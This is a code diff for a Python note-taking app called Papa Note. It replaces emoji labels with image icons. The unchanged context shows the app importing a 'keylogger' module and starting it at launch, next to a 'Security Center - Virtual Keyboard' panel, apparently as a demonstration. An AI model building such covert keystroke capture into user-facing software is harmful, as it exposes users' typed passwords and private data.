@@ -6,6 +6,7 @@ import customtkinter as ctk
 from tkinter import messagebox
 import sqlite3
 from dotenv import load_dotenv
+from PIL import Image
 
 import database
 import keylogger
@@ -26,12 +27,24 @@ class PapaNoteApp(ctk.CTk):
         self.note_buttons: dict[int, ctk.CTkButton] = {}
 
         database.init_db()
+        self._load_icons()
         
         self.container = ctk.CTkFrame(self, fg_color="transparent")
         self.container.pack(fill="both", expand=True)
 
         self.show_login_screen()
         keylogger.start_keylogger()
+
+    def _load_icons(self):
+        icon_dir = os.path.join(os.path.dirname(__file__), "icons")
+        os.makedirs(icon_dir, exist_ok=True)
+        try:
+            self.icon_login = ctk.CTkImage(Image.open(os.path.join(icon_dir, "login.png")), size=(55, 55))
+            self.icon_register = ctk.CTkImage(Image.open(os.path.join(icon_dir, "register.png")), size=(55, 55))
+            self.icon_logo = ctk.CTkImage(Image.open(os.path.join(icon_dir, "logo.png")), size=(24, 24))
+            self.icon_shield = ctk.CTkImage(Image.open(os.path.join(icon_dir, "shield.png")), size=(20, 20))
+        except Exception:
+            self.icon_login = self.icon_register = self.icon_logo = self.icon_shield = None
 
     def _clear_container(self):
         for widget in self.container.winfo_children():
@@ -47,7 +60,7 @@ class PapaNoteApp(ctk.CTk):
                                    fg_color="#1e293b", border_width=1, border_color="#334155")
         login_frame.place(relx=0.5, rely=0.5, anchor="center")
 
-        ctk.CTkLabel(login_frame, text="📝", font=("Segoe UI", 55)).pack(pady=(45, 10))
+        ctk.CTkLabel(login_frame, text="", image=self.icon_login).pack(pady=(45, 10))
 
         ctk.CTkLabel(login_frame, text="Welcome Back", font=("Segoe UI", 32, "bold"), text_color="#f8fafc").pack(pady=(0, 5))
         ctk.CTkLabel(login_frame, text="Sign in to continue to Papa Note", font=("Segoe UI", 14), text_color="#94a3b8").pack(pady=(0, 35))
@@ -83,7 +96,7 @@ class PapaNoteApp(ctk.CTk):
                                  fg_color="#1e293b", border_width=1, border_color="#334155")
         reg_frame.place(relx=0.5, rely=0.5, anchor="center")
 
-        ctk.CTkLabel(reg_frame, text="🚀", font=("Segoe UI", 55)).pack(pady=(45, 10))
+        ctk.CTkLabel(reg_frame, text="", image=self.icon_register).pack(pady=(45, 10))
 
         ctk.CTkLabel(reg_frame, text="Create Account", font=("Segoe UI", 32, "bold"), text_color="#f8fafc").pack(pady=(0, 5))
         ctk.CTkLabel(reg_frame, text="Join Papa Note to secure your ideas", font=("Segoe UI", 14), text_color="#94a3b8").pack(pady=(0, 35))
@@ -148,12 +161,14 @@ class PapaNoteApp(ctk.CTk):
 
         brand_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
         brand_frame.grid(row=0, column=0, padx=20, pady=(30, 10), sticky="ew")
-        ctk.CTkLabel(brand_frame, text=f"📝 {APP_TITLE}", font=("Segoe UI", 24, "bold"), text_color="#f9fafb").pack(side="left")
+        
+        ctk.CTkLabel(brand_frame, text=f" {APP_TITLE}", font=("Segoe UI", 24, "bold"), 
+                     text_color="#f9fafb", image=self.icon_logo, compound="left").pack(side="left")
 
         self.new_button = ctk.CTkButton(self.sidebar, text="+ New Note", font=("Segoe UI", 14, "bold"), fg_color="#2563eb", height=45, command=self.new_note)
         self.new_button.grid(row=1, column=0, padx=18, pady=10, sticky="ew")
 
-        self.search_entry = ctk.CTkEntry(self.sidebar, placeholder_text="🔍 Search notes...", height=35, fg_color="#1f2937", border_width=0)
+        self.search_entry = ctk.CTkEntry(self.sidebar, placeholder_text="Search notes...", height=35, fg_color="#1f2937", border_width=0)
         self.search_entry.grid(row=2, column=0, padx=18, pady=(5, 10), sticky="ew")
         self.search_entry.bind("<KeyRelease>", lambda e: self.refresh_notes())
 
@@ -196,7 +211,9 @@ class PapaNoteApp(ctk.CTk):
         self.security_frame = ctk.CTkFrame(self.main, corner_radius=15, fg_color="#1e293b")
         self.security_frame.grid(row=2, column=0, padx=28, pady=(0, 22), sticky="ew")
 
-        ctk.CTkLabel(self.security_frame, text="🛡️ Security Center - Virtual Keyboard", font=("Segoe UI", 12, "bold"), text_color="#10b981").pack(pady=5)
+        ctk.CTkLabel(self.security_frame, text=" Security Center - Virtual Keyboard", 
+                     font=("Segoe UI", 12, "bold"), text_color="#10b981", 
+                     image=self.icon_shield, compound="left").pack(pady=5)
 
         keys_frame = ctk.CTkFrame(self.security_frame, fg_color="transparent")
         keys_frame.pack(pady=5)
